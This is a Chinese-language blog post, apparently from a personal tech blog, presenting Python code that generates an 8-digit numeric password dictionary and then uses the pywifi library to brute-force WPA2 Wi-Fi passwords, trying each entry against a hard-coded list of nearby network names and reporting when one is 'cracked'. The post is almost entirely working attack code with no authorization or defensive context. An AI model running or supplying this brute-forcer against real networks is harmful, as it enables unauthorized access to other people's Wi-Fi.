<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>商伟的技术博客</title>
	<meta name="description" content="">
	<meta name="author" content="商伟">

	<!-- HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
		<script src="/theme/html5.js"></script>
	<![endif]-->

	<!-- Styles -->
	<link href="/theme/bootstrap.min.css" rel="stylesheet">
	<link href="/theme/local.css" rel="stylesheet">
	<link href="/theme/pygments.css" rel="stylesheet">

	<!-- Feeds -->




</head>
<body>
	<div class="topbar">
	  <div class="topbar-inner">
		<div class="container-fluid">
		  <a class="brand" href="/">商伟的技术博客</a>
			<ul class="nav">
					<li ><a href="/category/django.html">Django</a></li>
					<li ><a href="/category/docker.html">Docker</a></li>
					<li ><a href="/category/git.html">GIT</a></li>
					<li ><a href="/category/javascript.html">JavaScript</a></li>
					<li ><a href="/category/mongodb.html">Mongodb</a></li>
					<li ><a href="/category/mysql.html">MySQL</a></li>
					<li ><a href="/category/pa-chong.html">爬虫</a></li>
					<li class="active"><a href="/category/python.html">Python</a></li>
					<li ><a href="/category/rabbitmq.html">RabbitMQ</a></li>
					<li ><a href="/category/redis.html">redis</a></li>
					<li ><a href="/category/shu-ju-jie-gou.html">数据结构</a></li>
					<li ><a href="/category/sui-shou-bi-ji.html">随手笔记</a></li>
					<li ><a href="/category/supervisor.html">Supervisor</a></li>
					<li ><a href="/category/vue.html">VUE</a></li>
					<li ><a href="/category/wang-luo.html">网络</a></li>
					<li ><a href="/category/web.html">web</a></li>
					<li ><a href="/category/xiao-cheng-xu.html">小程序</a></li>
					<li ><a href="/category/xu-ni-huan-jing.html">虚拟环境</a></li>
			</ul>
			<p class="pull-right"><a href="/archives.html">[archives]</a> <a href="/tags.html">[tags]</a></p>
		</div>
	  </div>
	</div>

	<div class="container-fluid">
	  <div class="sidebar">
		<div class="well">
			<h3>Blogroll</h3>
			<ul>
				<li><a href="http://getpelican.com/">Pelican</a></li>
				<li><a href="http://python.org/">Python.org</a></li>
				<li><a href="http://jinja.pocoo.org/">Jinja2</a></li>
			</ul>
			<div class="social">
			<h3>Social</h3>
			<ul>
				<li><a href="https://lienze.tech/">老渔夫吃虾米</a></li>
			</ul>
			</div>
		</div>
	  </div>
	  <div class="content">
	<div class='article'>
		<div class="page-header"><h1>Python-链接WIFI</h1></div>
		<div class="well small">Permalink: <a class="more" href="/Python-链接WIFI.html">0999-01-01 18:44:00+00:09</a>
by <a class="url fn" href="/author/shang-wei.html">商伟 </a>
 in <a href="/category/python.html">Python</a>
tags: <a href="/tag/python.html">Python</a> </div>
		<div><h4>生成密码字段</h4>
<div class="highlight"><pre><span></span><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">import</span> <span class="nn">itertools</span> <span class="kn">as</span> <span class="nn">its</span>

<span class="c1"># 单个字符的集合</span>
<span class="n">words</span><span class="o">=</span><span class="s2">&quot;0123456789&quot;</span>

<span class="c1"># 每次任选一个字符，重复8次</span>
<span class="n">arrays</span> <span class="o">=</span> <span class="n">its</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">words</span><span class="p">,</span> <span class="n">repeat</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span>

<span class="c1"># 写入txt文本文件</span>
<span class="n">dictionary</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;C:/Users/Administrator/Desktop/dictionary.txt&quot;</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">arrays</span><span class="p">:</span>
    <span class="c1"># 一行密码</span>
    <span class="n">dictionary</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">item</span><span class="p">))</span>
    <span class="c1"># 换行</span>
    <span class="n">dictionary</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>

<span class="c1"># 关闭文件</span>
<span class="n">dictionary</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">print</span><span class="p">(</span><span class="s2">&quot;[mission completion]&quot;</span><span class="p">)</span>
</pre></div>


<h4>链接WIFI</h4>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pywifi</span>
<span class="kn">from</span> <span class="nn">pywifi</span> <span class="kn">import</span> <span class="n">const</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1">#测试连接，返回链接结果</span>
<span class="k">def</span> <span class="nf">wifiConnect</span><span class="p">(</span><span class="n">ssid</span><span class="p">,</span><span class="n">pwd</span><span class="p">):</span>
    <span class="c1"># 抓取网卡接口</span>
    <span class="n">wifi</span><span class="o">=</span><span class="n">pywifi</span><span class="o">.</span><span class="n">PyWiFi</span><span class="p">()</span>
    <span class="c1"># 获取第一个无线网卡</span>
    <span class="n">ifaces</span><span class="o">=</span><span class="n">wifi</span><span class="o">.</span><span class="n">interfaces</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
    <span class="c1"># 断开所有连接</span>
    <span class="n">ifaces</span><span class="o">.</span><span class="n">disconnect</span><span class="p">()</span>
    <span class="c1"># 休眠一秒</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="c1"># 获取网卡状态</span>
    <span class="n">wifistatus</span><span class="o">=</span><span class="n">ifaces</span><span class="o">.</span><span class="n">status</span><span class="p">()</span>
    <span class="c1"># 未连接时</span>
    <span class="k">if</span> <span class="n">wifistatus</span> <span class="o">==</span><span class="n">const</span><span class="o">.</span><span class="n">IFACE_DISCONNECTED</span><span class="p">:</span>
        <span class="c1"># 创建WiFi连接文件</span>
        <span class="n">profile</span><span class="o">=</span><span class="n">pywifi</span><span class="o">.</span><span class="n">Profile</span><span class="p">()</span>
        <span class="c1"># 要连接WiFi的名称</span>
        <span class="n">profile</span><span class="o">.</span><span class="n">ssid</span><span class="o">=</span><span class="n">ssid</span>
        <span class="c1"># 网卡的开放状态</span>
        <span class="n">profile</span><span class="o">.</span><span class="n">auth</span><span class="o">=</span><span class="n">const</span><span class="o">.</span><span class="n">AUTH_ALG_OPEN</span>
        <span class="c1"># wifi加密算法</span>
        <span class="n">profile</span><span class="o">.</span><span class="n">akm</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">const</span><span class="o">.</span><span class="n">AKM_TYPE_WPA2PSK</span><span class="p">)</span>
        <span class="c1"># 加密单元</span>
        <span class="n">profile</span><span class="o">.</span><span class="n">cipher</span><span class="o">=</span><span class="n">const</span><span class="o">.</span><span class="n">CIPHER_TYPE_CCMP</span>
        <span class="c1"># 调用密码</span>
        <span class="n">profile</span><span class="o">.</span><span class="n">key</span><span class="o">=</span><span class="n">pwd</span>
        <span class="c1"># 删除所有连接过的wifi文件</span>
        <span class="n">ifaces</span><span class="o">.</span><span class="n">remove_all_network_profiles</span><span class="p">()</span>
        <span class="c1"># 设定新的连接文件</span>
        <span class="n">tep_profile</span><span class="o">=</span><span class="n">ifaces</span><span class="o">.</span><span class="n">add_network_profile</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span>
        <span class="c1"># 连接</span>
        <span class="n">ifaces</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">tep_profile</span><span class="p">)</span>
        <span class="c1"># wifi连接时间</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
        <span class="c1"># 连接成功</span>
        <span class="k">if</span> <span class="n">ifaces</span><span class="o">.</span><span class="n">status</span><span class="p">()</span><span class="o">==</span><span class="n">const</span><span class="o">.</span><span class="n">IFACE_CONNECTED</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">True</span>
        <span class="c1"># 连接失败</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;已有wifi连接&quot;</span><span class="p">)</span> 

<span class="c1">#读取密码本</span>
<span class="k">def</span> <span class="nf">readPassword</span><span class="p">(</span><span class="n">ssid</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;开始破解:&quot;</span><span class="p">,</span><span class="n">ssid</span><span class="p">)</span>
    <span class="c1"># 密码本路径</span>
    <span class="n">dictionary_path</span><span class="o">=</span><span class="s2">&quot;C:/Users/Administrator/dictionary.txt&quot;</span>
    <span class="c1"># 打开文件 </span>
    <span class="nb">file</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">dictionary_path</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)</span>

    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    # 这里可以跳行保存上次的进度，接着破解</span>
<span class="sd">    for i in range(16547):</span>
<span class="sd">        line = file.readline()</span>
<span class="sd">    &#39;&#39;&#39;</span>

    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># 一行一行读取</span>
            <span class="n">line</span><span class="o">=</span><span class="nb">file</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
            <span class="c1"># 读完了退出</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="c1"># 破解结果</span>
            <span class="nb">bool</span><span class="o">=</span><span class="n">wifiConnect</span><span class="p">(</span><span class="n">ssid</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>

            <span class="c1"># 破解成功</span>
            <span class="k">if</span> <span class="nb">bool</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">ssid</span><span class="p">,</span><span class="s2">&quot;的密码已破解： &quot;</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="s2">&quot;WiFi已自动连接！！！&quot;</span><span class="p">)</span>
                <span class="k">break</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="c1"># 跳出当前循环，进行下一次循环</span>
                <span class="k">print</span><span class="p">(</span><span class="n">ssid</span><span class="p">,</span><span class="s2">&quot;的密码破解中....密码校对: &quot;</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
        <span class="c1"># Ctrl-C中止程序</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s2">&quot;中止程序&quot;</span><span class="p">)</span>
            <span class="k">break</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="c1"># 这里手动输入周围的WiFi名字</span>
    <span class="n">wifi_names</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;ChinaNet-A&#39;</span><span class="p">,</span><span class="s1">&#39;奥托曼的WIFI&#39;</span><span class="p">,</span><span class="s1">&#39;360Wifi&#39;</span><span class="p">]</span>
    <span class="c1"># 测试每个WiFi</span>
    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">wifi_names</span><span class="p">:</span>
        <span class="n">readPassword</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>
</pre></div></div>
	</div>
		<footer>
		  <p>Powered by <a href="http://getpelican.com/">Pelican</a>. Theme based on <a href="http://twitter.github.com/bootstrap/">Twitter Bootstrap</a>.</p>
		  <p>&copy; 商伟</p>
		</footer>
	  </div>

	</div>
</body>
</html>